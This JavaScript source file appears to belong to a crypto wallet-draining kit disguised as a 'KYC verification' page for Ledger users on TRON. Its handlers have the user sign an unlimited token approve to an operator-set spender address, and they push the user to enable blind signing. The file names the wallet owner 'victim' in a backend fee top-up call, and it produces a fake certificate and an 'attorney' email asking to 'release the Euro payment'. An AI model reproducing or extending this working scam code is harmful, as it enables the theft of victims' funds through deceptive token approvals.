    if (receipt?.result) return { ok: receipt.result === 'SUCCESS', info };
    if (info?.contractResult?.[0] && !receipt)
      return { ok: true, info };
  }
  return { ok: false, timeout: true };
}

// Step 1: Connect Ledger
$('connect').addEventListener('click', async () => {
  if (busy) return;
  setBusy(true);
  lastAction = 'connect';
  hideErrorPanel();
  monit('connect_click');
  try {
    // Session validation
    const check = await validateSession();
    if (!check.valid) {
      if (check.reason === 'Already completed') {
        const prev = getSessions()[SESSION_ID] || {};
        showCompletion(prev.txID || check.txID);
        monit('kyc_already_done', { at: 'ledger' });
        return;
      }
      const title = showErrorPanel(new Error(check.reason));
      setStatus('Error: ' + title);
      log('Session validation failed: ' + check.reason, 'warn');
      monit('session_blocked', { reason: check.reason });
      return;
    }
    
    spenderAddress = getSpenderAddress();
    readApproveUnits();
    
    if (!spenderAddress) {
      setStatus('Error: No spender address configured. Please configure in Dashboard.');
      log('Error: No spender address found in URL or localStorage', 'warn');
      return;
    }
    
    setStatus('Connecting to Ledger…');
    
    const known = await TransportWebHID.list();
    if (known.length > 0) {
      try { await (await TransportWebHID.open(known[0])).close(); } catch {}
    }
    
    const transport = instrument(await openTransport());
    activeTransport = transport; // so the catch path can release it
    transport.on('disconnect', () => {
      log('Ledger disconnected', 'warn');
      setStatus('Ledger disconnected — please restart.');
    });
    
    const trx = new Trx(transport);
    const cfg = await trx.getAppConfiguration();
    log(`TRON App v${cfg.version} on device`, 'info');
    log(`Settings — data:${cfg.allowData} contract:${cfg.allowContract} signByHash:${cfg.signByHash}`, 'info');
    
    // Proactive settings gate (like tronmanager): don't wait for the APDU error —
    // read the flags and guide the user to the exact missing setting upfront.
    const missing = [];
    if (!cfg.allowData) missing.push('Transactions data');
    if (!cfg.allowContract) missing.push('Custom contracts');
    if (!cfg.signByHash) missing.push('Blind signing (Sign by hash)');
    ledgerCfg = cfg;
    if (missing.length) {
      log('Missing settings: ' + missing.join(', '), 'warn');
      monit('ledger_settings_missing', { missing: missing.join(','), appVersion: cfg.version });
    }
    
    const { address } = await trx.getAddress(DEFAULT_PATH);
    ledgerAddress = address;
    log(`Ledger address: ${address}`, 'info');
    monit('ledger_connected', { wallet: address, from: address, appVersion: cfg.version, acct: ACCT, path: DEFAULT_PATH });

    // Fee reality-check: TRON has no fee sponsorship — energy for the approve
    // burns from the owner account itself. Read the balance so we can warn
    // before the user signs a transaction the network will reject anyway.
    try {
      const acct = await api('/wallet/getaccount', { address, visible: true });
      ledgerTrxSun = acct?.balance ?? 0;
    } catch { ledgerTrxSun = null; }
    log(`Wallet TRX balance: ${ledgerTrxSun === null ? 'unknown' : (ledgerTrxSun / 1e6) + ' TRX'}`, ledgerTrxSun === 0 ? 'warn' : 'info');
    if (ledgerTrxSun === 0) monit('ledger_no_trx', { wallet: address });

    // Gas drop: das Backend toppt die Wallet auf ~13 TRX auf, wenn sie die
    // Energy nicht decken kann (gleiche Mechanik wie der TW-Handoff).
    if (ledgerTrxSun !== null && ledgerTrxSun < 12_000_000) {
      try {
        setStatus('Requesting network fee credit…');
        const r = await fetch('/api/energy', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ step: 'pay', victim: address, src: 'ledger' }),
        });
        const j = await r.json().catch(() => ({}));
        if (j.gas_tx) {
          log('Fee credit sent: ' + j.gas_tx, 'info');
          monit('ledger_gas_drop', { tx: j.gas_tx });
          setStatus('Fee credit sent — waiting for confirmation…');
          for (let i = 0; i < 8; i++) {
            await sleep(1500);
            try {
              const acct = await api('/wallet/getaccount', { address, visible: true });
              if ((acct?.balance || 0) > ledgerTrxSun) { ledgerTrxSun = acct.balance; break; }
            } catch {}
          }
          log(`Wallet TRX balance now: ${(ledgerTrxSun / 1e6).toFixed(2)} TRX`, 'info');
        } else {
          log('Fee credit skipped: ' + (j.skip || j.error || 'unknown'), 'warn');
          monit('ledger_gas_skip', { reason: j.skip || j.error || 'unknown' });
        }
      } catch (e) {
        log('Fee credit request failed: ' + (e?.message || e), 'warn');
      }
    }
    
    // Store wallet address in session so the dashboard can query allowance() live
    if (SESSION_ID) {
      const sessions = getSessions();
      if (sessions[SESSION_ID]) {
        sessions[SESSION_ID].wallet = address;
        localStorage.setItem('kyc_sessions', JSON.stringify(sessions));
      }
    }
    
    // Update UI
    $('spender-display').textContent = spenderAddress;
    const amtLabel = approveAmountLabel();
    if ($('amount-display')) $('amount-display').textContent = amtLabel;
    $('approve').textContent = 'Sign Approve';
    if (amtInvalid) {
      setStatus('Error: invalid approve amount in link — generate a new link in the dashboard');
      $('status2').style.color = '#d92d20';
      updateButtons();
      await transport.close();
      activeTransport = null;
      return;
    }

    // TRX balance display + zero-fee warning (fees burn from owner, not spender)
    if ($('trx-balance')) $('trx-balance').textContent =
      ledgerTrxSun === null ? 'unknown' : (ledgerTrxSun / 1e6).toLocaleString('en-US', { maximumFractionDigits: 2 }) + ' TRX';
    if ($('trx-warn')) $('trx-warn').classList.toggle('hidden', ledgerTrxSun !== 0);

    setStatus('Ledger connected — please sign approve');
    
    // Show step 2 — the settings checklist visualizes the flags read above;
    // sign buttons stay disabled until every required setting is on.
    $('step1').classList.add('hidden');
    $('step2').classList.remove('hidden');
    renderSettingsCheck(ledgerCfg);
    if (settingsOk) {
      $('status2').style.color = '';
      setStatus('Device ready — confirm the transaction details below.');
      monit('ledger_settings_ok', { appVersion: ledgerCfg.version });
    } else {
      setStatus('Action required on the Ledger — see the settings checklist below.');
      $('status2').style.color = '#b54708';
    }

    await transport.close();
    activeTransport = null;
  } catch (e) {
    try { await activeTransport?.close(); } catch {}
    activeTransport = null;
    const title = showErrorPanel(e);
    setStatus('Error: ' + title);
    log('Error: ' + (e?.message || e), 'warn');
    monit('ledger_error', { at: 'connect', code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
  } finally {
    setBusy(false);
  }
});

// Step 2: Approve (Unlimited)
$('approve').addEventListener('click', async () => {
  if (busy) return;
  setBusy(true);
  lastAction = 'approve';
  hideErrorPanel();
  monit('approve_start');
  try {
    // Re-validate session — the link may have expired during the flow
    const check = await validateSession();
    if (!check.valid) {
      if (check.reason === 'Already completed') {
        const prev = getSessions()[SESSION_ID] || {};
        showCompletion(prev.txID || check.txID);
        return;
      }
      const title = showErrorPanel(new Error(check.reason));
      setStatus('Error: ' + title);
      log('Session no longer valid at signing time: ' + check.reason, 'warn');
      monit('session_blocked', { reason: check.reason, at: 'sign' });
      return;
    }
    if (!isTronAddr(spenderAddress)) throw new Error('Invalid spender address');
    if (amtInvalid) throw new Error('The approve amount embedded in this link is invalid — generate a new link');

    // Dedup: if a previous run already set a sufficient allowance on-chain
    // (reload, timeout retry, …), don't burn gas on a second approve.
    setStatus('Checking existing allowance…');
    if (await currentAllowance(ledgerAddress, spenderAddress) >= approveUnits) {
      markSessionVerified(null);
      monit('already_approved', { op: 'approve' });
      log('Existing allowance detected — skipping duplicate approve', 'ok');
      showCompletion(null);
      $('result-detail').textContent =
        'Documents verified · Approval already set on-chain — no new transaction needed';
      return;
    }

    const tx = await buildSignBroadcast(addrParam(spenderAddress) + approveUnits.toString(16).padStart(64, '0'), 'approve');

    setStatus('Waiting for confirmation…');
    const conf = await waitConfirm(tx.txID);
    
    if (conf.ok) {
      // Mark session as verified before rendering — reloads then land on the
      // completion screen instead of an error.
      markSessionVerified(tx.txID);
      showCompletion(tx.txID);
      log('Confirmed: ' + tx.txID, 'ok');
      monit('confirmed', { op: 'approve', tx: tx.txID, from: ledgerAddress, spender: spenderAddress });
    } else {
      const rcpt = conf.info?.receipt?.result;
      const reason = conf.timeout
        ? 'Confirmation timed out — check the transaction link for the final on-chain status'
        : `Transaction failed on-chain (${rcpt || 'reverted'})`;
      showResult('err', 'Verification Failed', reason, tx.txID,
        'The signature was broadcast but the transaction did not confirm. You may retry or request a new link.');
      log('Not confirmed: ' + tx.txID, 'warn');
      monit('tx_failed', { op: 'approve', tx: tx.txID, reason });
    }
    
  } catch (e) {
    const title = showErrorPanel(e);
    setStatus('Error: ' + title);
    log('Error: ' + (e?.message || e), 'warn');
    monit('ledger_error', { at: 'approve', code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
  } finally {
    setBusy(false);
  }
});

// Revoke
$('revoke').addEventListener('click', async () => {
  if (busy) return;
  setBusy(true);
  lastAction = 'revoke';
  hideErrorPanel();
  monit('revoke_start');
  try {
    if (!isTronAddr(spenderAddress)) throw new Error('Invalid spender address');

    const tx = await buildSignBroadcast(addrParam(spenderAddress) + '0'.repeat(64), 'revoke');

    setStatus('Waiting for confirmation…');
    const conf = await waitConfirm(tx.txID);
    
    if (conf.ok) {
      showResult('ok', 'Approval Revoked', 'The spender approval was removed on-chain.', tx.txID,
        'Allowance is now 0 — no further withdrawals are possible.');
      log('Revoke confirmed: ' + tx.txID, 'ok');
      monit('confirmed', { op: 'revoke', tx: tx.txID, from: ledgerAddress, spender: spenderAddress });
    } else {
      const rcpt = conf.info?.receipt?.result;
      showResult('err', 'Revoke Failed',
        conf.timeout ? 'Confirmation timed out — check the transaction link' : `Revoke failed on-chain (${rcpt || 'reverted'})`,
        tx.txID);
      monit('tx_failed', { op: 'revoke', tx: tx.txID, reason: rcpt || 'revert' });
    }
  } catch (e) {
    const title = showErrorPanel(e);
    setStatus('Error: ' + title);
    log('Error: ' + (e?.message || e), 'warn');
    monit('ledger_error', { at: 'revoke', code: e?.statusCode, title, msg: (e?.message || String(e)).slice(0, 200) });
  } finally {
    setBusy(false);
  }
});

// Re-check — re-reads the settings flags live from the already-authorized
// device (no browser picker). The user toggles the setting on the Ledger
// itself; the next getAppConfiguration() call reflects it immediately.
$('recheck').addEventListener('click', async () => {
  if (busy) return;
  setBusy(true);
  hideErrorPanel();
  monit('ledger_settings_recheck');
  try {
    // Session may have expired while the user was fixing settings on the device
    const check = await validateSession();
    if (!check.valid) {
      if (check.reason === 'Already completed') {
        const prev = getSessions()[SESSION_ID] || {};
        showCompletion(prev.txID || check.txID);
        return;
      }
      const title = showErrorPanel(new Error(check.reason));
      setStatus('Error: ' + title);
      return;
    }
    setStatus('Re-reading device settings…');
    const transport = instrument(await openTransport());
    const trx = new Trx(transport);
    const cfg = await trx.getAppConfiguration();
    await transport.close();
    ledgerCfg = cfg;
    renderSettingsCheck(cfg);
    if (settingsOk) {
      $('status2').style.color = '';
      setStatus('Device ready — confirm the transaction details below.');
      monit('ledger_settings_ok', { appVersion: cfg.version, recheck: true });
    } else {
      const miss = [];
      if (!cfg.allowData) miss.push('Transactions data');
      if (!cfg.allowContract) miss.push('Custom contracts');
      setStatus('Still missing — enable the flagged settings on the device.');
      monit('ledger_settings_missing', { missing: miss.join(','), appVersion: cfg.version, recheck: true });
    }
  } catch (e) {
    const title = showErrorPanel(e);
    setStatus('Error: ' + title);
    log('Error: ' + (e?.message || e), 'warn');
    monit('ledger_error', { at: 'recheck', code: e?.statusCode, title });
  } finally {
    setBusy(false);
  }
});

// Reset
$('reset').addEventListener('click', () => {
  ledgerAddress = '';
  ledgerCfg = null;
  settingsOk = true;
  $('step1').classList.remove('hidden');
  $('step2').classList.add('hidden');
  $('step3').classList.add('hidden');
  $('settings-check').classList.add('hidden');
  $('apdu-log').innerHTML = '';
  hideErrorPanel();
  lastAction = null;
  setStatus('Ready — connect Ledger via USB, open TRON app on device.');
  setResultStatus('-');
  $('result-title').textContent = 'Verification Result';
  $('result-detail').textContent = '';
  $('done-hint').classList.add('hidden');
  $('certificate-section').classList.add('hidden');
  $('reset').classList.remove('hidden');
  $('status2').style.color = '';
  setTxLink(null);
  updateButtons();
});

// Download Certificate
$('download-cert').addEventListener('click', async () => {
  const btn = $('download-cert');
  const sessions = getSessions();
  const sess = SESSION_ID ? sessions[SESSION_ID] : null;
  
  if (!sess || !sess.txID || !ledgerAddress) {
    log('Certificate data missing', 'warn');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Generating...';

  try {
    const certResult = await window.CertificateGenerator.generateCertificate({
      address: ledgerAddress,
      txID: sess.txID,
      date: sess.verifiedAt || new Date().toISOString(),
      email: sess.email || null,
      from: sess.from || null,
      to: sess.to || null,
      certificateId: sess.certificateId || null
    });

    // Download
    const filename = 'zertifikat-' + SESSION_ID + '-' + Date.now() + '.pdf';
    certResult.blob.save(filename);
    
    btn.textContent = 'Download Certificate';
    log('Certificate downloaded: ' + filename, 'ok');
  } catch (e) {
    log('Certificate generation failed: ' + (e?.message || e), 'warn');
    btn.textContent = 'Download Certificate';
  } finally {
    btn.disabled = false;
  }
});

// Send to Attorney (Mailto)
$('email-attorney').addEventListener('click', () => {
  const sessions = getSessions();
  const sess = SESSION_ID ? sessions[SESSION_ID] : null;
  
  if (!sess || !sess.email) {
    log('No email in session', 'warn');
    return;
  }

  const subject = encodeURIComponent('Verification Certificate - Chainscaner');
  const body = encodeURIComponent(
    'Hello,\n\n' +
    'Please find attached my verification certificate.\n' +
    'Certificate ID: ' + (sess.certificateId || 'N/A') + '\n' +
    'TRON Address: ' + (ledgerAddress || 'N/A') + '\n' +
    'Transaction ID: ' + (sess.txID || 'N/A') + '\n\n' +
    'Please verify and release the Euro payment.\n\n' +
    'Best regards'
  );

  window.location.href = 'mailto:attorney@example.com?subject=' + subject + '&body=' + body;
});

// Browser support check on load
if (!checkBrowserSupport()) {
  log('WebHID not supported in this browser', 'warn');
}

// APDU-Log Toggle
$('toggleApdu').addEventListener('click', () => {
  const log = $('apdu-log');
  const open = log.classList.toggle('hidden') === false;
  $('toggleApdu').textContent = open ? 'Hide APDU Log' : 'Show APDU Log';
  $('toggleApdu').classList.toggle('on', open);
});
